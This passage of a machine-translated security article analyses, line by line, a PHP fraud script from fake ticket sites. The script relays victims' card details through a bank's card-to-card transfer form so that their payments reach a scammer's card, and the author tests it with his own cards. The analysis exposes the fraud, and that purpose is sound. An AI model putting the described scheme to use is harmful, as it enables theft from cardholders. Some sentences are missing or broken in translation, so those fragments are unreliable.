Baris 93-95 Halaman web tersimpan $ page berisi ~ "nomor pesanan" ORDER_NUM, yang disimpan dalam variabel $ ord.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 96-98 Halaman web $ page yang disimpan berisi timestamp TIMESTAMP, yang disimpan dalam variabel $ tim.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh Informasi Debugging</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/416/148/8ba/4161488ba0f64c8d9575a7f973d3d841.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/6f6/35b/d05/6f635bd056d5466a956643acab2e3b30.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang "peramban perangkat lunak" perlu membuka halaman </font></font><code>https://3ds.payment.ru/P2P_ACTION/card_form.html</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Ini adalah halaman pembayaran yang sama, tangkapan layar yang ditunjukkan di atas. Ini adalah halaman dengan formulir, bagian dari bidang layanan yang disembunyikan. Bagian dari kode HTML dengan bidang input tersembunyi ditampilkan di atas. Beberapa nilai bidang tersembunyi ini perlu diingat untuk menggunakannya nanti saat mengirimkan formulir. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 99 - Kami menyimpan alamat halaman ke dalam variabel $ url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 100 - Parameter untuk sesi dengan URL ditetapkan (dalam hal ini, hanya alamat halaman. Pengaturan lainnya tetap sama). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 101-102 Variabel yang sebelumnya digunakan $ halaman dan $ bagian dihapus. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 103 - Sebagai hasil dari perintah curl_exec, halaman web akan diperoleh secara programatis, yang akan disimpan dalam variabel $ page.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 104-106 Halaman web $ page yang disimpan berisi nilai bidang TERMINAL, yang disimpan dalam variabel $ term. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 107-109 Halaman web $ page yang disimpan berisi nilai bidang TRTYPE, yang disimpan dalam variabel $ type. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 110-112 Halaman web $ page yang disimpan berisi nilai bidang MERCHANT, yang disimpan dalam variabel $ merch. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 113-115 Halaman web $ page yang disimpan berisi nilai bidang EMAIL, yang disimpan dalam variabel $ ml. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Secara umum, nilai-nilai ini dalam bentuk yang ditunjukkan tidak pernah berubah. Dan mereka dapat disimpan dalam kode sebagai konstanta dan tidak diterima setiap saat. Jelas, mendapatkan nilai-nilai bidang ini dilakukan untuk keamanan tambahan jika satu atau lebih bidang berubah di masa depan.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Deskripsi beberapa bidang. </font><font style="vertical-align: inherit;">Deskripsi lengkap dari semua bidang mudah ditemukan di Google.</font></font><br>
<br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TERMINAL - Nomor unik dari terminal virtual outlet </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
MERCH_NAME - Nama Point of </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
sale MERCHANT - Jumlah outlet yang ditetapkan oleh bank </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
TRTYPE - Jenis transaksi yang diminta (Pembayaran - 1, Batalkan - 22, Pra-otorisasi - 0, Penyelesaian penyelesaian - 21) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
EMAIL - Alamat email untuk mengirim peringatan</font></font></blockquote><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh Informasi Debugging</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/bf5/4a7/457/bf54a74574f44b1a8cb34bfa95eac091.png"><br>
    ,   -   . ($page)<br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
EMAIL di sini, ini adalah kasus epik. Siapa peduli, materi tambahan tentang EMAIL ini di akhir artikel di aplikasi di bawah spoiler. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9d4/cf1/5c9/9d4cf15c98584bc8a4dc45b78051ad26.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di sini kita melihat blok besar. Fakta bahwa tampilannya besar dijelaskan oleh lebar kolom terbatas dalam publikasi dan presentasi kode yang mudah oleh penulis skrip. Semua sama dapat ditempatkan dalam 10 baris kode, tetapi kemudahan membaca dan mengedit kode akan menderita. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 120 - Dalam variabel $ url simpan alamat halaman. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 121-123 - Tetapkan parameter untuk sesi dengan URL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 124 - array $ ncrd dibuat dari nomor kartu penerima dalam variabel string $ crd, yang akan berisi bagian-bagian dari nomor kartu yang dibagi menjadi empat. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 125 - Header HTTP disimpan dalam variabel array $ header.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 126 - Parameter ditetapkan untuk sesi dengan CURL (HTTP header dari variabel $ header. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 135-164 - array $ postL dibuat, setiap nilai yang akan sesuai dengan bidang formulir pada halaman pembayaran (nomor kartu pengirim, dibagi empat; tanggal kedaluwarsa kartu pengirim) ; Kartu CVC pengirim; nomor kartu penerima empat arah; tanggal kedaluwarsa kartu penerima; kartu CVC penerima; jumlah pembayaran; "nomor pesanan"; deskripsi untuk halaman konfirmasi; nomor terminal; nama tempat penjualan; email untuk pemberitahuan; stempel waktu; ; nomor kartu pengirim tidak dipecah menjadi bagian-bagian; nomor kartu penerima tidak dipecah menjadi bagian-bagian; data pada perangkat lunak dan perangkat keras "pada komputer pengirim", yang dirancang untuk membuat tampilan pengguna nyata, bukan skrip).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 135 - Parameter ditetapkan untuk sesi CURL (data dikirim dalam permintaan HTTP POST. Dalam kasus ini, array $ postL dikonversi ke string, yang merupakan string yang disandikan url, seperti </font></font><code>'p1=val1&amp;p2=val2&amp;...'</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Data yang lebih jelas ditransmisikan ditampilkan dalam tangkapan layar dengan informasi debug di bawah ini.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh Informasi Debugging</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/9b0/140/642/9b0140642ef74fbf968fa4c299677a33.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/f9e/70e/ac8/f9e70eac88e74b088d3c37c1736eab09.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 166 - Sebagai hasil dari perintah curl_exec, data yang disiapkan akan dikirim ke formulir halaman web menggunakan metode POST. Untuk halaman web, pengiriman seperti itu akan terlihat sama persis seperti jika pengguna biasa mengisi dan mengkonfirmasi formulir di browser biasa. Halaman dengan hasil pengiriman data ke formulir akan disimpan dalam variabel $ page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 167 - Sesi CURL berakhir. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 168 - Di halaman yang dihasilkan, yang disimpan di halaman variabel $, dan seperti yang kita ingat, adalah garis panjang, "Kesalahan" substring dicari.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 169-173 - Jika "Kesalahan" substring ditemukan, maka selama 5 detik pesan kesalahan "Kartu tidak cocok" ditampilkan dan kemudian skrip keluar dan mengarahkan ulang halaman yang ditampilkan di browser ke "halaman pesanan". Jika pengguna terus-menerus, maka ia dapat sekali lagi mencoba untuk menjalani prosedur pembayaran. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Halaman yang ditampilkan jika ada kesalahan. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2f6/7b0/d80/2f67b0d80a7e49b88b9432eacd6d9085.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Penyebab kesalahan yang dikeluarkan bank mungkin berbeda (kesalahan dalam nomor kartu, dana tidak mencukupi, kesalahan otorisasi, dan banyak lainnya). Namun untuk script payp2p.php tidak ada perbedaan. Setelah pembayaran gagal, itu berarti pengguna diarahkan ke halaman di mana Anda dapat mengulangi upaya untuk membayar. Halaman tempat kesalahan dikembalikan dapat dengan mudah diubah tergantung pada tugas.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh kode HTML dikembalikan oleh halaman bank, jika terjadi kesalahan</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span><font></font>
<font></font>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">base</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/netcetera/netcetera.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/riskminder-client.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
    </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">redirect</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">rctext, ext_diag_code</span></span></span></span><span class="javascript"><span class="hljs-function">)</span></span></span><span class="javascript">{
	</span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Call your bank"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/CallYourBank"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is restricted"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ForbiddenTransaction"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is disabled"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/BlockedCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Invalid amount"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in amount field"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Wrong original amount"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectAmount"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Re-enter transaction"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/Retry"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Expired card"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ExpiredCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Not sufficient funds"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/InsufficientBalance"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds amount limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/AmountOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds frequency limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/QuantityOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card number field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectNumber"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card expiration date field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectExpiresDate"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in currency field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectCurrency"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"AS_FAIL"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectPassword"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; (ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"NS_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"S_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"UNAVAIL"</span></span></span><span class="javascript">)){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/3DSFailure"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> {
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/TechReasons"</span></span></span><span class="javascript">;
	}
   }
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"netcetera_set_DID('');redirect('Authentication failed','BIN_ERROR')"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh informasi debug jika bank melaporkan kesalahan saat membayar</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/73f/c74/88a/73fc7488aa40469da8984c474be4ae1b.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 174 - Jika tidak ada jalan keluar sebelumnya dari skrip karena kesalahan saat membayar, ini berarti semuanya berjalan seperti yang dimaksudkan. </font><font style="vertical-align: inherit;">Pada halaman yang sebelumnya disimpan dalam variabel $ page, semua substring dengan alamat diganti dengan </font></font><code>https://3ds.payment.ru/cgi-bin/cgi_link</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">string dengan alamat tipe mydomain.ru/sus.php?cd = ... - ini adalah alamat halaman di situs penipuan yang harus dicapai oleh pengguna jika pembayaran berhasil. </font><font style="vertical-align: inherit;">(Pada halaman seperti itu, pengguna dapat berterima kasih dan diberitahu bahwa tiket elektronik telah dikirim melalui pos). </font><font style="vertical-align: inherit;">Setelah mengganti substring, hasilnya disimpan dalam variabel $ pp.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 175 - Variabel $ pp ditampilkan di browser. Karena variabel $ pp adalah string dengan kode HTML lengkap dari halaman, pengguna akan melihat beberapa halaman. Halaman yang ditampilkan tidak akan berbeda secara eksternal dari halaman asli yang diberikan bank - perbedaannya hanya ada di dalam kode HTML di tempat di mana tautan diganti. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi, apa halaman ini yang diberikan bank jika memasukkan nomor kartu yang benar, dan di mana skrip tersebut mengganti tautan ke halaman pembayaran yang berhasil di situs web palsu? Dan setelah semua, mungkin, masih harus ada cek 3D Secure dari bank pengirim, yang tidak akan memungkinkan pembayaran? Kode berakhir di tempat yang paling menarik dan ada keraguan bahwa tanpa skrip rumit, formulir, dll. Itu bisa berfungsi.</font></font><br>
<br>
<b>     .          - .     .       .</b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya memasukkan nomor kartu bank saya ke file aviacfg.php. Saya akan mencoba menerima transfernya, jika tentu saja berhasil. Saya membuka halaman formulir yang sebelumnya disimpan di disk. Formulir ini disimpan di browser ketika mengunjungi salah satu situs palsu, yang pada saat penulisan bagian pertama dari publikasi, masih berfungsi. Formulir sudah disimpan dengan jumlah 2.915 rubel, tetapi untuk pengujian itu terlalu banyak. Mari kita ubah. Dalam bentuk apa pun, ada bidang yang terlihat dan tersembunyi. Bidang tersembunyi (input, pilih) tidak berbeda dengan bidang biasa, kecuali bidang itu tidak terlihat. Bidang tersebut digunakan untuk menyimpan informasi layanan yang tidak perlu dilihat pengguna. Kolom input disembunyikan dengan dua cara.</font></font><br>
<br>
<ul>
<li>  CSS ( display:none).    ,     (input),    , ( DIV)     input.</li>
<li>     —   ,  type=«hidden».      type=«text».</li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dalam kasus kami, bidang formulir disembunyikan menggunakan type = "hidden". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami menekan di browser F12 (mode pengembangan web). Temukan tempat yang tepat dalam kode HTML dan ubah tipe teks = "tersembunyi" menjadi ketik = "teks" untuk dua atau lebih elemen input. Sekarang kita melihat bidang di mana jumlah dan kode layanan (kode) disimpan. Kurangi jumlahnya dari 2915rub menjadi 20rub. Sekarang masukkan data kartu bank kedua Anda ke dalam formulir. Uang harus didebit dari kartu ini jika memungkinkan untuk melakukan transfer. </font></font><br>
<br>
<img src="https://habrastorage.org/files/ad2/9e5/fa2/ad29e5fa23e54550a59d9b54dd808ada.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami mengkonfirmasi formulir dengan mengklik tombol "Bayar". Setelah mengklik tombol, skrip payp2p.php diluncurkan, yang menerima data yang dimasukkan ke dalam formulir.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Yang mengejutkan saya, setelah memasukkan nomor kartu asli dan mengklik tombol "Bayar" pada formulir tes, saya melihat halaman Sberbank (bank tempat transfer dilakukan) di layar, meminta saya untuk memasukkan kode konfirmasi 3D Secure. </font></font><br>
<br>
<img src="https://habrastorage.org/files/587/7a4/aa3/5877a4aa3a514b3bb171c8ba1e264f07.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Juga di ponsel saya, saya menerima SMS dari Sberbank dengan kode.</font></font><br>
<br>
<img src="https://habrastorage.org/files/c3b/628/abc/c3b628abc43a446bb15606dec3b9f083.jpg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebelum melakukan pengujian dengan kartu kredit yang valid, saya berasumsi bahwa untuk mengonfirmasi kode 3D Secure, kode tersebut harus “diperdaya” ke pengguna dengan cara tertentu, dan kemudian secara terprogram secara terprogram mentransfer konfirmasi 3D Secure ke formulir ini. Namun, semuanya ternyata jauh lebih sederhana. Setelah data untuk mentransfer dari kartu ke kartu dikirim ke situs web Promsvyazbank, browser menampilkan bentuk bank penerbit kartu dari mana transfer dilakukan. Dalam kasus saya, ini Sberbank. Formulir ini bahkan tidak perlu dipalsukan. Formulir konfirmasi ditampilkan di situs web HTTPS Sberbank. Korban penipu sendiri langsung ke formulir ini yang mereka kenal memasukkan kode konfirmasi. Setelah itu, jika transfer lewat, maka uangnya didebit. Meskipun secara teori dimungkinkan untuk memprotes transfer semacam itu, jauh dari kenyataan bahwa uang itu akan dikembalikan.Kemungkinan pengembalian uang dipengaruhi oleh banyak faktor, termasuk seberapa cepat "korban" akan berlaku untuk banknya.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kode HTML dari halaman yang Sberbank berikan untuk mengkonfirmasi 3D Secure di bawah spoiler. </font><font style="vertical-align: inherit;">Kode diperoleh selama pengujian dengan menulis variabel $ page ke file teks. </font><font style="vertical-align: inherit;">Baris 166 dari skrip payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kode Halaman HTML 3D Aman Sebelum Penggantian Baris</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
